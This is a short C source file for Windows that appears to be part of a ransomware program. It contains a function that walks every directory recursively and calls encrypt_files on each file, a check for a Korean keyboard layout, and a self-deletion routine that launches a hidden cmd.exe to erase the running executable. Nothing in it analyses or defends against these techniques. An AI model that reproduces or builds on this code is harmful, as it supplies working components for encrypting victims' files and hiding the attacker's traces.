#include "utils.h"
#include "crypto.h"

#define SELF_REMOVE_STRING	TEXT("cmd.exe /C ping 1.1.1.1 -n 1 -w 3000 > Nul & Del /f /q \"%s\"")

void deleteMe()
{
	TCHAR szModuleName[MAX_PATH];
	TCHAR szCmd[2 * MAX_PATH];
	STARTUPINFO si = { sizeof(si) };
	PROCESS_INFORMATION pi = { 0 };

	GetModuleFileName(NULL, szModuleName, MAX_PATH);

	StringCbPrintf(szCmd, 2 * MAX_PATH, SELF_REMOVE_STRING, szModuleName);

	CreateProcess(NULL, szCmd, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);

	CloseHandle(pi.hThread);
	CloseHandle(pi.hProcess);
}

bool checkKor()
{
	HKL hKeyboardLayout;

	hKeyboardLayout = GetKeyboardLayout(0);

	if (LOWORD(hKeyboardLayout) == 0x0412) return true;
	else return false;
}

void find_files(char *path)
{
	WIN32_FIND_DATA FindData;
	HANDLE hFind;
	char buf[MAX_PATH];

	strncpy_s(buf, path, MAX_PATH);
	strcat_s(buf, MAX_PATH, "*.*");

	hFind = FindFirstFile(buf, &FindData);

	if (hFind != INVALID_HANDLE_VALUE) {
		do {
			if (strncmp(FindData.cFileName,".", 1) == 0 || strncmp(FindData.cFileName,"..", 2) == 0)
				continue;

			else if (FindData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
				strncpy_s(buf, path, MAX_PATH);
				strcat_s(buf, MAX_PATH, FindData.cFileName);
				strcat_s(buf, MAX_PATH, "\\");

				find_files(buf);
			}

			else {
				strncpy_s(buf, path, MAX_PATH);
				strcat_s(buf, MAX_PATH, FindData.cFileName);
				encrypt_files(buf);
			}
		} while (FindNextFile(hFind, &FindData));
	}

	FindClose(hFind);
}